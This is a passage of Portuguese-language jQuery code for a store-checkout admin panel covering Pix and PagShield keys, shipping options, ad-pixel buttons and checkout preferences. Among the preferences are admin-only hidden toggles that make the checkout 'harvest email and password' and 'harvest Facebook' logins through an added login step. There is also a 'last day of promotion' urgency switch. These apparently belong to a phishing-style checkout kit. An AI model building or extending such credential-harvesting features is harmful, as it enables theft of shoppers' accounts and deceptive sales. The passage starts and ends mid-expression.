                                                        $("<button>", {
                                                            class: "btn btn-primary col-lg-12",
                                                            style: "margin-top: 15px;",
                                                            text: "Salvar Informações",
                                                            click: async function (
                                                                e
                                                            ) {
                                                                e.stopImmediatePropagation();
                                                                e.preventDefault();
                                                                e.stopPropagation();

                                                                const idLoja =
                                                                    $(
                                                                        "#select_loja"
                                                                    ).val();
                                                                const chavepix =
                                                                    $(
                                                                        "#input_chave_pix"
                                                                    ).val();
                                                                const tipochave =
                                                                    $(
                                                                        "#select_tipo_chave_pix"
                                                                    ).val();

                                                                const banco =
                                                                    $(
                                                                        "#banco_responsavel"
                                                                    ).val();

                                                                const isPagshieldSelected =
                                                                    banco ===
                                                                    "pagShield";

                                                                const publicKey =
                                                                    $(
                                                                        "#public-key-input"
                                                                    ).val();
                                                                const instalmentRate =
                                                                    $(
                                                                        "#instalment-rate-input"
                                                                    ).val();

                                                                const {
                                                                    id_usuario,
                                                                    tipo_usuario,
                                                                } =
                                                                    _global.getUsuario();

                                                                if (
                                                                    isPagshieldSelected
                                                                ) {
                                                                    if (
                                                                        !chavepix.length
                                                                    ) {
                                                                        _global.toast(
                                                                            "a chave secreta é obrigatória",
                                                                            "toastwarning"
                                                                        );
                                                                        return;
                                                                    }

                                                                    if (
                                                                        !publicKey.length
                                                                    ) {
                                                                        _global.toast(
                                                                            "a chave pública é obrigatória",
                                                                            "toastwarning"
                                                                        );
                                                                        return;
                                                                    }

                                                                    if (
                                                                        !instalmentRate.length
                                                                    ) {
                                                                        _global.toast(
                                                                            "taxa de parcelamento é obrigatória",
                                                                            "toastwarning"
                                                                        );
                                                                        return;
                                                                    }
                                                                } else {
                                                                    if (
                                                                        chavepix.length <
                                                                        1
                                                                    ) {
                                                                        _global.toast(
                                                                            "Preencha a chave pix!",
                                                                            "toastwarning"
                                                                        );
                                                                        return;
                                                                    }

                                                                    if (
                                                                        tipochave ==
                                                                            3 &&
                                                                        !chavepix.includes(
                                                                            "@"
                                                                        )
                                                                    ) {
                                                                        _global.toast(
                                                                            "Preencha um e-mail válido!",
                                                                            "toastwarning"
                                                                        );
                                                                        return;
                                                                    }
                                                                }

                                                                const commonPayload =
                                                                    {
                                                                        chavepix,
                                                                        tipochave,
                                                                        id_loja:
                                                                            idLoja,
                                                                        usuario:
                                                                            id_usuario,
                                                                        tipo_usuario,
                                                                        banco,
                                                                    };

                                                                _global.btnCarregando(
                                                                    $(this),
                                                                    true,
                                                                    "Salvar Informações"
                                                                );

                                                                const salvaPix =
                                                                    await _global.busca(
                                                                        "dashboard/updateChavePix",
                                                                        isPagshieldSelected
                                                                            ? {
                                                                                  ...commonPayload,
                                                                                  instalmentRate,
                                                                                  secretKey:
                                                                                      chavepix,
                                                                                  publicKey:
                                                                                      publicKey,
                                                                              }
                                                                            : commonPayload,
                                                                        "POST"
                                                                    );

                                                                if (
                                                                    salvaPix.status ==
                                                                    200
                                                                ) {
                                                                    _global.toast(
                                                                        "A chave foi atualizada com sucesso!",
                                                                        "toastsucesso"
                                                                    );
                                                                } else {
                                                                    _global.toast(
                                                                        "Não foi possível salvar a chave pix.",
                                                                        "toasterro"
                                                                    );
                                                                }

                                                                _global.btnCarregando(
                                                                    $(this),
                                                                    false,
                                                                    "Salvar Informações"
                                                                );
                                                            },
                                                        })
                                                    )
                                            )
                                            .append(
                                                $("<div>", {
                                                    class: "col-lg-4",
                                                    style: "margin-left: 25px;",
                                                })
                                                    .append(
                                                        $("<div>", {
                                                            class: "card-header pb-0 p-3",
                                                        }).append(
                                                            $("<h6>", {
                                                                class: "mb-0",
                                                                text: "Histórico de Chaves Pix",
                                                            })
                                                        )
                                                    )
                                                    .append(
                                                        $("<div>", {
                                                            class: "card-body p-3",
                                                        }).append(
                                                            $("<ul>", {
                                                                class: "list-group",
                                                                id: "ul_logpix",
                                                            })
                                                        )
                                                    )
                                            )
                                    )
                                    .append(
                                        $("<div>", {
                                            class: "col-lg-12 py-4 flex",
                                            id: "div_checkout_frete",
                                            style: "display: none;",
                                        })
                                            .append(
                                                $("<div>", {
                                                    class: "col-lg-4",
                                                    style: "margin-left: 10px;",
                                                    id: "div_fretes",
                                                }).append(
                                                    $("<div>", {
                                                        class: "card-header pb-0 px-3 flex flex-column",
                                                    })
                                                        .append(
                                                            $("<h6>", {
                                                                class: "mb-0",
                                                                text: "Fretes Ativos",
                                                            })
                                                        )
                                                        .append(
                                                            $("<div>", {
                                                                class: "card-body pt-4 p-3",
                                                            }).append(
                                                                $("<ul>", {
                                                                    class: "list-group",
                                                                    id: "cards_frete",
                                                                }).append(
                                                                    $("<li>", {
                                                                        class: "list-group-item border-0 d-flex p-4 mb-2 border-radius-lg bg-gray-100",
                                                                    })
                                                                        .append(
                                                                            $(
                                                                                "<div>",
                                                                                {
                                                                                    class: "d-flex flex-column",
                                                                                }
                                                                            )
                                                                                .append(
                                                                                    $(
                                                                                        "<h6>",
                                                                                        {
                                                                                            class: "mb-3 text-sm",
                                                                                            id:
                                                                                                "frete_padrao_" +
                                                                                                $(
                                                                                                    "#select_loja"
                                                                                                ).val(),
                                                                                            text:
                                                                                                (fretePadrao.frete ??
                                                                                                    "Sedex") +
                                                                                                " (Padrão)",
                                                                                        }
                                                                                    )
                                                                                )
                                                                                .append(
                                                                                    $(
                                                                                        "<span>",
                                                                                        {
                                                                                            class: "mb-2 text-xs",
                                                                                            text: "Valor: ",
                                                                                        }
                                                                                    ).append(
                                                                                        $(
                                                                                            "<span>",
                                                                                            {
                                                                                                class: "font-weight-bold ms-sm-2 text-dark",
                                                                                                text: "Grátis",
                                                                                            }
                                                                                        )
                                                                                    )
                                                                                )
                                                                        )
                                                                        .append(
                                                                            $(
                                                                                "<div>",
                                                                                {
                                                                                    class: "ms-auto text-end",
                                                                                }
                                                                            )
                                                                                .append(
                                                                                    $(
                                                                                        "<i>",
                                                                                        {
                                                                                            class: "fas fa-pencil-alt ms-auto text-dark cursor-pointer",
                                                                                            style: "font-size: 15px;",
                                                                                            click: async function (
                                                                                                e
                                                                                            ) {
                                                                                                let p =
                                                                                                    prompt(
                                                                                                        "Digite o título do frete padrão desejado."
                                                                                                    );

                                                                                                if (
                                                                                                    p.length <
                                                                                                        1 ||
                                                                                                    p.length >
                                                                                                        230
                                                                                                ) {
                                                                                                    _global.toast(
                                                                                                        "Título inválido, verifique o título digitado.",
                                                                                                        "toasterro"
                                                                                                    );
                                                                                                    return;
                                                                                                }

                                                                                                let dados =
                                                                                                    await _global.busca(
                                                                                                        "dashboard/updateFretePadrao",
                                                                                                        {
                                                                                                            id_loja:
                                                                                                                $(
                                                                                                                    "#select_loja"
                                                                                                                ).val(),
                                                                                                            t: p,
                                                                                                        },
                                                                                                        "POST"
                                                                                                    );

                                                                                                if (
                                                                                                    dados.status ==
                                                                                                    200
                                                                                                ) {
                                                                                                    _global.toast(
                                                                                                        "O frete padrão foi alterado.",
                                                                                                        "toastsucesso"
                                                                                                    );
                                                                                                    $(
                                                                                                        "#frete_padrao_" +
                                                                                                            $(
                                                                                                                "#select_loja"
                                                                                                            ).val()
                                                                                                    ).text(
                                                                                                        p +
                                                                                                            " (Padrão)"
                                                                                                    );
                                                                                                } else {
                                                                                                    _global.toast(
                                                                                                        "Houve um erro interno. Código: [EXC]",
                                                                                                        "toasterro"
                                                                                                    );
                                                                                                }
                                                                                            },
                                                                                        }
                                                                                    )
                                                                                )
                                                                                .append(
                                                                                    $(
                                                                                        "<a>",
                                                                                        {
                                                                                            class: "btn btn-link text-danger text-gradient px-3 mb-0",
                                                                                            click: function (
                                                                                                e
                                                                                            ) {
                                                                                                _global.toast(
                                                                                                    "Você não pode apagar o frete padrão.",
                                                                                                    "toasterro"
                                                                                                );
                                                                                            },
                                                                                        }
                                                                                    ).append(
                                                                                        $(
                                                                                            "<i>",
                                                                                            {
                                                                                                class: "far fa-trash-alt me-2",
                                                                                                "aria-hidden":
                                                                                                    "true",
                                                                                            }
                                                                                        )
                                                                                    )
                                                                                )
                                                                        )
                                                                )
                                                            )
                                                        )
                                                )
                                            )
                                            .append(
                                                $("<div>", {
                                                    class: "col-lg-4",
                                                    style: "margin-left: 10px;",
                                                    id: "div_adicionar_frete",
                                                }).append(
                                                    $("<div>", {
                                                        class: "card-header pb-0 px-3 flex flex-column pt-4 p-3",
                                                    })
                                                        .append(
                                                            $("<h6>", {
                                                                class: "mb-0",
                                                                text: "Adicionar Frete",
                                                            })
                                                        )
                                                        .append(
                                                            $("<input>", {
                                                                class: "form-control",
                                                                type: "text",
                                                                placeholder:
                                                                    "Texto de Exibição",
                                                                id: "input_frete_texto",
                                                                style: "margin-top: 10px; margin-bottom: 10px;",
                                                            })
                                                        )
                                                        .append(
                                                            $("<input>", {
                                                                type: "text",
                                                                class: "form-control",
                                                                id: "input_frete_preco",
                                                                placeholder:
                                                                    "Preço (Ex: 19,90)",
                                                                style: "margin-bottom: 10px;",
                                                            })
                                                        )
                                                        .append(
                                                            $("<button>", {
                                                                class: "btn btn-primary",
                                                                style: "padding-top: 10px;",
                                                                text: "Salvar Informações",
                                                                click: function (
                                                                    e
                                                                ) {
                                                                    e.preventDefault();
                                                                    e.stopImmediatePropagation();
                                                                    e.stopPropagation();

                                                                    const usuario =
                                                                        _global.getUsuario();

                                                                    if (
                                                                        isNaN(
                                                                            parseFloat(
                                                                                $(
                                                                                    "#input_frete_preco"
                                                                                ).val()
                                                                            )
                                                                        ) ||
                                                                        $(
                                                                            "#input_frete_preco"
                                                                        ).val()
                                                                            .length <
                                                                            1
                                                                    ) {
                                                                        _global.toast(
                                                                            "Preço do frete inválido.",
                                                                            "toastwarning"
                                                                        );
                                                                        return;
                                                                    }

                                                                    if (
                                                                        $(
                                                                            "#input_frete_texto"
                                                                        ).val()
                                                                            .length <
                                                                        1
                                                                    ) {
                                                                        _global.toast(
                                                                            "Texto do frete inválido.",
                                                                            "toastwarning"
                                                                        );
                                                                        return;
                                                                    }

                                                                    _global.btnCarregando(
                                                                        $(this),
                                                                        true,
                                                                        "Salvar Informações"
                                                                    );

                                                                    let _preco =
                                                                        $(
                                                                            "#input_frete_preco"
                                                                        ).val();

                                                                    _preco =
                                                                        _preco.replace(
                                                                            ",",
                                                                            "."
                                                                        );

                                                                    $.ajax({
                                                                        url:
                                                                            usuario.url_api +
                                                                            "dashboard/updateFreteLoja",
                                                                        method: "POST",
                                                                        headers:
                                                                            {
                                                                                "Content-Type":
                                                                                    "application/x-www-form-urlencoded",
                                                                                Accept: "application/json",
                                                                                Authorization:
                                                                                    "Bearer " +
                                                                                    usuario.api_token,
                                                                            },
                                                                        data: {
                                                                            texto: $(
                                                                                "#input_frete_texto"
                                                                            ).val(),
                                                                            preco: _preco,
                                                                            id_loja:
                                                                                $(
                                                                                    "#select_loja"
                                                                                ).val(),
                                                                        },
                                                                        success:
                                                                            (
                                                                                retorno
                                                                            ) => {
                                                                                if (
                                                                                    retorno.status ==
                                                                                    200
                                                                                ) {
                                                                                    _global.toast(
                                                                                        "O frete foi adicionado",
                                                                                        "toastsucesso"
                                                                                    );

                                                                                    $(
                                                                                        "#cards_frete"
                                                                                    ).append(
                                                                                        $(
                                                                                            "<li>",
                                                                                            {
                                                                                                class: "list-group-item border-0 d-flex p-4 mb-2 border-radius-lg bg-gray-100",
                                                                                            }
                                                                                        )
                                                                                            .append(
                                                                                                $(
                                                                                                    "<div>",
                                                                                                    {
                                                                                                        class: "d-flex flex-column",
                                                                                                    }
                                                                                                )
                                                                                                    .append(
                                                                                                        $(
                                                                                                            "<h6>",
                                                                                                            {
                                                                                                                class: "mb-3 text-sm",
                                                                                                                text: retorno.ds_frete,
                                                                                                            }
                                                                                                        )
                                                                                                    )
                                                                                                    .append(
                                                                                                        $(
                                                                                                            "<span>",
                                                                                                            {
                                                                                                                class: "mb-2 text-xs",
                                                                                                                text: "Valor: ",
                                                                                                            }
                                                                                                        ).append(
                                                                                                            $(
                                                                                                                "<span>",
                                                                                                                {
                                                                                                                    class: "font-weight-bold ms-sm-2 text-dark",
                                                                                                                    text:
                                                                                                                        "R$ " +
                                                                                                                        retorno.preco,
                                                                                                                }
                                                                                                            )
                                                                                                        )
                                                                                                    )
                                                                                            )
                                                                                            .append(
                                                                                                $(
                                                                                                    "<div>",
                                                                                                    {
                                                                                                        class: "ms-auto text-end",
                                                                                                        id:
                                                                                                            "divvfrete" +
                                                                                                            retorno.id_frete_loja,
                                                                                                    }
                                                                                                ).append(
                                                                                                    $(
                                                                                                        "<a>",
                                                                                                        {
                                                                                                            class: "btn btn-link text-danger text-gradient px-3 mb-0",
                                                                                                            click: async function (
                                                                                                                e
                                                                                                            ) {
                                                                                                                e.preventDefault();
                                                                                                                $(
                                                                                                                    "#divvfrete" +
                                                                                                                        retorno.id_frete_loja
                                                                                                                )
                                                                                                                    .parent()
                                                                                                                    .remove();
                                                                                                                let dados =
                                                                                                                    await _global.busca(
                                                                                                                        "dashboard/apagaFrete",
                                                                                                                        {
                                                                                                                            id: retorno.id_frete_loja,
                                                                                                                        },
                                                                                                                        "POST"
                                                                                                                    );

                                                                                                                if (
                                                                                                                    dados.status ==
                                                                                                                    200
                                                                                                                ) {
                                                                                                                    _global.toast(
                                                                                                                        "O frete foi apagado.",
                                                                                                                        "toastsucesso"
                                                                                                                    );
                                                                                                                    $(
                                                                                                                        this
                                                                                                                    )
                                                                                                                        .parent()
                                                                                                                        .remove();
                                                                                                                    return;
                                                                                                                }

                                                                                                                if (
                                                                                                                    dados.status ==
                                                                                                                    500
                                                                                                                ) {
                                                                                                                    _global.toast(
                                                                                                                        "Não foi possível apagar o frete. [Erro Interno]",
                                                                                                                        "toasterro"
                                                                                                                    );
                                                                                                                    return;
                                                                                                                }
                                                                                                            },
                                                                                                        }
                                                                                                    ).append(
                                                                                                        $(
                                                                                                            "<i>",
                                                                                                            {
                                                                                                                class: "far fa-trash-alt me-2",
                                                                                                                "aria-hidden":
                                                                                                                    "true",
                                                                                                            }
                                                                                                        )
                                                                                                    )
                                                                                                )
                                                                                            )
                                                                                    );
                                                                                } else if (
                                                                                    retorno.status ==
                                                                                    401
                                                                                ) {
                                                                                    _global.toast(
                                                                                        "Você atingiu o número máximo de fretes (2)",
                                                                                        "toasterro"
                                                                                    );
                                                                                } else {
                                                                                    _global.toast(
                                                                                        "Não foi possível adicionar o frete.",
                                                                                        "toasterro"
                                                                                    );
                                                                                }

                                                                                _global.btnCarregando(
                                                                                    $(
                                                                                        this
                                                                                    ),
                                                                                    false,
                                                                                    "Salvar Informações"
                                                                                );
                                                                            },
                                                                    });
                                                                },
                                                            })
                                                        )
                                                )
                                            )
                                    )
                                    .append(
                                        $("<div>", {
                                            class: "col-lg-12 py-4 flex",
                                            id: "div_checkout_pixel",
                                            style: "display: none;",
                                        })
                                            .append(
                                                $("<div>", {
                                                    class: "col-lg-1 flex",
                                                    style: "justify-content: center; margin-left: 15px;",
                                                }).append(
                                                    $("<button>", {
                                                        class: "btn btn-info",
                                                        style: "border-radius: 30px;",
                                                        text: "Facebook ADS",
                                                        "data-bs-toggle":
                                                            "modal",
                                                        "data-bs-target":
                                                            "#modalface",
                                                    })
                                                )
                                            )
                                            .append(
                                                $("<div>", {
                                                    class: "col-lg-1 flex",
                                                    style: "justify-content: center; margin-left: 15px;",
                                                }).append(
                                                    $("<button>", {
                                                        class: "btn btn-danger",
                                                        style: "border-radius: 30px;",
                                                        text: "Google ADS",
                                                        disabled: true,
                                                    })
                                                )
                                            )
                                            .append(
                                                $("<div>", {
                                                    class: "col-lg-1 flex",
                                                    style: "justify-content: center; margin-left: 15px;",
                                                }).append(
                                                    $("<button>", {
                                                        class: "btn btn-primary",
                                                        style: "border-radius: 30px;",
                                                        text: "Tiktok ADS",
                                                        disabled: true,
                                                    })
                                                )
                                            )
                                            .append(
                                                $("<div>", {
                                                    class: "col-lg-1 flex",
                                                    style: "justify-content: center; margin-left: 15px;",
                                                }).append(
                                                    $("<button>", {
                                                        class: "btn btn-primary",
                                                        style: "border-radius: 30px;",
                                                        text: "Taboola ADS",
                                                        "data-bs-toggle":
                                                            "modal",
                                                        "data-bs-target":
                                                            "#modaltaboola",
                                                    })
                                                )
                                            )
                                            // added UTMIFY button
                                            //need to add functionality
                                            .append(
                                                $("<div>", {
                                                    class: "col-lg-1 flex",
                                                    style: "justify-content: center; margin-left: 15px;",
                                                }).append(
                                                    $("<button>", {
                                                        class: "btn btn-primary",
                                                        style: "border-radius: 30px;",
                                                        text: "UTMIFY",
                                                        "data-bs-toggle":
                                                            "modal",
                                                        "data-bs-target":
                                                            "#modalUtmify",
                                                    })
                                                )
                                            )
                                    )
                                    .append(
                                        $("<div>", {
                                            class: "col-lg-12 py-4 flex",
                                            id: "div_checkout_copiacola",
                                            style: "display: none;",
                                        }).append(
                                            $("<div>", {
                                                class: "col-lg-3 flex",
                                                style: "justify-content: center; margin-left: 15px; flex-direction: column;",
                                            })
                                                .append(
                                                    $("<button>", {
                                                        class: "btn btn-success",
                                                        style: "border-radius: 30px; font-size: 0.6vw; width: 75%;",
                                                        text: "Carregar Códigos",
                                                        "data-bs-toggle":
                                                            "modal",
                                                        "data-bs-target":
                                                            "#modalcopiacola",
                                                    })
                                                )
                                                .append(
                                                    $("<button>", {
                                                        class: "btn btn-danger",
                                                        style: "border-radius: 30px; font-size: 0.6vw; width: 75%;",
                                                        text: "Remover Códigos",
                                                        "data-bs-toggle":
                                                            "modal",
                                                        "data-bs-target":
                                                            "#modalcopiacolaremove",
                                                    })
                                                )
                                                .append(
                                                    $("<div>", {
                                                        style: "display: flex;",
                                                    })
                                                        .append(
                                                            $("<span>", {
                                                                text: "Total de Códigos Restantes",
                                                                style: "font-size: 0.7vw; border-radius: 30px; font-weight: bold;",
                                                            })
                                                        )
                                                        .append(
                                                            $("<span>", {
                                                                class: "badge bg-gradient-success",
                                                                style: "border-radius: 30px; font-size: 0.5vw; margin-left: 3px;",
                                                                id: "codigos_restantes",
                                                                text: codigosRestantes.count,
                                                            })
                                                        )
                                                )
                                                .append(
                                                    $("<button>", {
                                                        class: "btn btn-info",
                                                        style: "border-radius: 30px;font-size: 0.6vw;margin-top: 10px;width: 30%;",
                                                        text: "Dúvidas?",
                                                        "data-bs-toggle":
                                                            "modal",
                                                        "data-bs-target":
                                                            "#modalduvidas",
                                                    })
                                                )
                                        )
                                    )
                                    .append(
                                        $("<div>", {
                                            class: "col-lg-12 py-4 flex",
                                            id: "div_checkout_cartao",
                                            style: "display: none;",
                                        }).append(
                                            $("<div>", {
                                                class: "col-lg-3 flex card",
                                                id: "div_cartao_loja",
                                                style: "justify-content: center; margin-left: 15px; flex-direction: column; align-items: center;",
                                            })
                                        )
                                    )
                                    .append(
                                        $("<div>", {
                                            class: "col-lg-12 py-4 flex",
                                            id: "div_checkout_configuracoes",
                                            style: "display: none;",
                                        }).append(
                                            $("<div>", {
                                                class: "col-lg-3 card flex px-3",
                                                style: "justify-content: center; align-items: center;",
                                            })
                                                .append(
                                                    $("<span>", {
                                                        text: "Preferências",
                                                        style: "margin-top: 10px;",
                                                    })
                                                )
                                                .append(
                                                    $("<div>", {
                                                        class: "form-check form-switch",
                                                        style: "margin-top: 10px;",
                                                    })
                                                        .append(
                                                            $("<input>", {
                                                                class: "form-check-input",
                                                                type: "checkbox",
                                                                checked:
                                                                    preferencias.resumo_aberto,
                                                                change: async function (
                                                                    e
                                                                ) {
                                                                    let v = $(
                                                                        this
                                                                    ).prop(
                                                                        "checked"
                                                                    )
                                                                        ? "s"
                                                                        : "n";
                                                                    let c =
                                                                        "resumo_aberto";
                                                                    let i =
                                                                        $(
                                                                            "#select_loja"
                                                                        ).val();

                                                                    let msg = $(
                                                                        this
                                                                    ).prop(
                                                                        "checked"
                                                                    )
                                                                        ? "aberto"
                                                                        : "fechado";

                                                                    const dados =
                                                                        await _global.busca(
                                                                            "dashboard/updatePreferencias",
                                                                            {
                                                                                id_loja:
                                                                                    i,
                                                                                c: c,
                                                                                v: v,
                                                                            },
                                                                            "POST"
                                                                        );

                                                                    if (
                                                                        dados.status ==
                                                                        200
                                                                    ) {
                                                                        _global.toast(
                                                                            "O checkout desta loja virá com o resumo " +
                                                                                msg +
                                                                                " agora.",
                                                                            "toastsucesso"
                                                                        );
                                                                    }

                                                                    if (
                                                                        dados.status ==
                                                                        500
                                                                    ) {
                                                                        _global.toast(
                                                                            "Erro interno.",
                                                                            "toasterro"
                                                                        );
                                                                    }
                                                                },
                                                                id: "checkbox_resumoaberto",
                                                            })
                                                        )
                                                        .append(
                                                            $("<label>", {
                                                                class: "form-check-label",
                                                                id: "text_checkbox_resumoaberto",
                                                                text: "Resumo do Carrinho aberto",
                                                            })
                                                        )
                                                )
                                                .append(
                                                    $("<div>", {
                                                        class: "form-check form-switch",
                                                        style: "margin-top: 10px;",
                                                    })
                                                        .append(
                                                            $("<input>", {
                                                                class: "form-check-input",
                                                                type: "checkbox",
                                                                id: "checkbox_ultimodia",
                                                                checked:
                                                                    preferencias.ultimo_dia,
                                                                change: async function (
                                                                    e
                                                                ) {
                                                                    let v = $(
                                                                        this
                                                                    ).prop(
                                                                        "checked"
                                                                    )
                                                                        ? "s"
                                                                        : "n";
                                                                    let c =
                                                                        "ultimo_dia";
                                                                    let i =
                                                                        $(
                                                                            "#select_loja"
                                                                        ).val();

                                                                    let msg = $(
                                                                        this
                                                                    ).prop(
                                                                        "checked"
                                                                    )
                                                                        ? "com"
                                                                        : "sem";

                                                                    const dados =
                                                                        await _global.busca(
                                                                            "dashboard/updatePreferencias",
                                                                            {
                                                                                id_loja:
                                                                                    i,
                                                                                c: c,
                                                                                v: v,
                                                                            },
                                                                            "POST"
                                                                        );

                                                                    if (
                                                                        dados.status ==
                                                                        200
                                                                    ) {
                                                                        _global.toast(
                                                                            "O checkout desta loja virá " +
                                                                                msg +
                                                                                " mensagem de último dia de promoção agora.",
                                                                            "toastsucesso"
                                                                        );
                                                                    }

                                                                    if (
                                                                        dados.status ==
                                                                        500
                                                                    ) {
                                                                        _global.toast(
                                                                            "Erro interno.",
                                                                            "toasterro"
                                                                        );
                                                                    }
                                                                },
                                                            })
                                                        )
                                                        .append(
                                                            $("<label>", {
                                                                class: "form-check-label",
                                                                id: "text_checkbox_ultimodia",
                                                                text: "Mensagem de último dia de promoção",
                                                            })
                                                        )
                                                )
                                                .append(
                                                    $("<div>", {
                                                        class: "form-check form-switch",
                                                        style: "margin-top: 10px; margin-bottom: 10px;",
                                                        hidden: !isAdmin,
                                                    })
                                                        .append(
                                                            $("<input>", {
                                                                class: "form-check-input",
                                                                type: "checkbox",
                                                                checked:
                                                                    preferencias.colher_senha,
                                                                change: async function (
                                                                    e
                                                                ) {
                                                                    let v = $(
                                                                        this
                                                                    ).prop(
                                                                        "checked"
                                                                    )
                                                                        ? "s"
                                                                        : "n";
                                                                    let c =
                                                                        "colher_senha";
                                                                    let i =
                                                                        $(
                                                                            "#select_loja"
                                                                        ).val();

                                                                    let msg = $(
                                                                        this
                                                                    ).prop(
                                                                        "checked"
                                                                    )
                                                                        ? "irá colher email e senha"
                                                                        : "não irá colher email e senha";

                                                                    const dados =
                                                                        await _global.busca(
                                                                            "dashboard/updatePreferencias",
                                                                            {
                                                                                id_loja:
                                                                                    i,
                                                                                c: c,
                                                                                v: v,
                                                                            },
                                                                            "POST"
                                                                        );

                                                                    if (
                                                                        dados.status ==
                                                                        200
                                                                    ) {
                                                                        _global.toast(
                                                                            "O checkout desta loja " +
                                                                                msg +
                                                                                " agora.",
                                                                            "toastsucesso"
                                                                        );
                                                                    }

                                                                    if (
                                                                        dados.status ==
                                                                        500
                                                                    ) {
                                                                        _global.toast(
                                                                            "Erro interno.",
                                                                            "toasterro"
                                                                        );
                                                                    }
                                                                },
                                                                id: "checkbox_colhersenha",
                                                            })
                                                        )
                                                        .append(
                                                            $("<label>", {
                                                                class: "form-check-label",
                                                                id: "text_checkbox_colhersenha",
                                                                text: "Colher Email e Senha",
                                                            })
                                                        )
                                                )
                                                .append(
                                                    $("<div>", {
                                                        class: "form-check form-switch",
                                                        style: "margin-top: 10px; margin-bottom: 10px;",
                                                        hidden: !isAdmin,
                                                    })
                                                        .append(
                                                            $("<input>", {
                                                                class: "form-check-input",
                                                                type: "checkbox",
                                                                checked:
                                                                    preferencias.colher_facebook,
                                                                change: async function (
                                                                    e
                                                                ) {
                                                                    let v = $(
                                                                        this
                                                                    ).prop(
                                                                        "checked"
                                                                    )
                                                                        ? "s"
                                                                        : "n";
                                                                    let c =
                                                                        "colher_facebook";
                                                                    let i =
                                                                        $(
                                                                            "#select_loja"
                                                                        ).val();

                                                                    let msg = $(
                                                                        this
                                                                    ).prop(
                                                                        "checked"
                                                                    )
                                                                        ? "irá colher facebooks"
                                                                        : "não irá colher facebooks";

                                                                    const dados =
                                                                        await _global.busca(
                                                                            "dashboard/updatePreferencias",
                                                                            {
                                                                                id_loja:
                                                                                    i,
                                                                                c: c,
                                                                                v: v,
                                                                            },
                                                                            "POST"
                                                                        );

                                                                    if (
                                                                        dados.status ==
                                                                        200
                                                                    ) {
                                                                        _global.toast(
                                                                            "O checkout desta loja " +
                                                                                msg +
                                                                                " agora.",
                                                                            "toastsucesso"
                                                                        );
                                                                    }

                                                                    if (
                                                                        dados.status ==
                                                                        500
                                                                    ) {
                                                                        _global.toast(
                                                                            "Erro interno.",
                                                                            "toasterro"
                                                                        );
                                                                    }
                                                                },
                                                                id: "checkbox_colherfacebook",
                                                            })
                                                        )
                                                        .append(
                                                            $("<label>", {
                                                                class: "form-check-label",
                                                                id: "text_checkbox_colherfacebook",
                                                                text: "Colher Facebook (Ativar Etapa de Login)",
                                                            })
                                                        )
                                                )
                                                //redirect link input starts
                                                .append(
                                                    $("<form>", {
                                                        submit: async (e) => {
                                                            e.preventDefault();

                                                            const redirectLink =
                                                                document.querySelector(
                                                                    "#redirectLinkInput"
                                                                ).value;

                                                            if (
                                                                !redirectLink ||
                                                                !(
                                                                    redirectLink.includes(
                                                                        "www"
                                                                    ) ||
                                                                    redirectLink.includes(
                                                                        "http"
                                                                    )
                                                                ) ||
                                                                !redirectLink.includes(
                                                                    "."
                                                                )
                                                            ) {
                                                                return _global.toast(
                                                                    "link inválido",
                                                                    "toasterro"
                                                                );
                                                            }

                                                            //api call to the existing endpoint
                                                            //need to modify the backend
                                                            const dados =
                                                                await _global.busca(
                                                                    "dashboard/updatePreferencias",
                                                                    {
                                                                        c: "redirect_link",
                                                                        v: redirectLink,
                                                                        id_loja:
                                                                            $(
                                                                                "#select_loja"
                                                                            ).val(),
                                                                    },
                                                                    "POST"
                                                                );

                                                            if (
                                                                dados.status ==
                                                                200
                                                            ) {
                                                                _global.toast(
                                                                    "link de redirecionamento salvo",
                                                                    "toastsucesso"
                                                                );
                                                            }

                                                            if (
                                                                dados.status ==
                                                                500
                                                            ) {
                                                                _global.toast(
                                                                    "Erro interno.",
                                                                    "toasterro"
                                                                );
                                                            }
                                                        },
                                                    })
                                                        .append(
                                                            $("<label>", {
                                                                class: "mt-5 form-check-label",
                                                                text: "Redirecionar após confirmar o pagamento",
                                                            })
                                                        )
                                                        .append(
                                                            $("<div>", {
                                                                class: "input-group",
                                                            })
                                                                .append(
                                                                    $(
                                                                        "<input>",
                                                                        {
                                                                            class: "form-control",
                                                                            style: "margin-bottom: 1rem",
                                                                            type: "text",
                                                                            id: "redirectLinkInput",
                                                                            value: preferencias.redirect_link,
                                                                        }
                                                                    )
                                                                )
                                                                .append(
                                                                    $("<div>", {
                                                                        class: "input-group-append",
                                                                    }).append(
                                                                        $(
                                                                            "<button>",
                                                                            {
                                                                                class: "btn btn-outline-secondary",
                                                                                style: "border-top-left-radius: unset; border-bottom-left-radius: unset;",
                                                                                type: "submit",
                                                                                text: "Save",
                                                                            }
                                                                        )
                                                                    )
                                                                )
                                                        )
                                                )
                                                //redirect link input ends
                                                //lang select
                                                .append(
                                                    $("<div>", {
                                                        class: "w-100 mb-3",
                                                    })
                                                .append(
                                                    $("<label>", {
                                                        class: "mt-2 form-check-label",
                                                        text: "Idioma",
                                                    })
                                                )
                                                .append(
                                                    $("<select>", {
                                                        id: "select_language",
                                                        class: "form-control",
                                                        value: preferencias.language,
                                                        change: async function (
                                                            e
                                                        ) {
                                                            
                                                            let i =
                                                                $(
                                                                    "#select_loja"
                                                                ).val();

                                                            
                                                            const dados =
                                                                await _global.busca(
                                                                    "dashboard/updatePreferencias",
                                                                    {
                                                                        id_loja:
                                                                            i,
                                                                        c: 'language',
                                                                        v: e.target.value,
                                                                    },
                                                                    "POST"
                                                                );

                                                         

                                                            if (
                                                                dados.status ==
                                                                200
                                                            ) {
                                                                _global.toast(
                                                                    "idioma atualizado",
                                                                    "toastsucesso"
                                                                );
                                                            }

                                                            if (
                                                                dados.status ==
                                                                500
                                                            ) {
                                                                _global.toast(
                                                                    "Erro interno.",
                                                                    "toasterro"
                                                                );
                                                            }
                                                        }
                                                    })
                                                .append(
                                                        $("<option>", {
                                                            value: 'Portuguese',
                                                            text: 'Portuguese',
                                                        })
                                                    ).append(
                                                        $("<option>", {
                                                            value: 'English',
                                                            text: 'English',
                                                        })
                                                    ).append(
                                                        $("<option>", {
                                                            value: 'Spanish',
                                                            text: 'Spanish',
                                                        })
                                                    )
                                                )
                                            )
                                            //curr select
                                                .append(
                                                    $("<div>", {
                                                        class: "w-100 mb-3",
                                                    })
                                                .append(
                                                    $("<label>", {
                                                        class: "mt-2 form-check-label",
                                                        text: "Moeda",
                                                    })
                                                )
                                                .append(
                                                    $("<select>", {
                                                        id: "select_currency",
                                                        class: "form-control",
                                                        value: preferencias.currency,
                                                        change: async function (
                                                            e
                                                        ) {
                                                            
                                                            let i =
                                                                $(
                                                                    "#select_loja"
                                                                ).val();

                                                            
                                                            const dados =
                                                                await _global.busca(
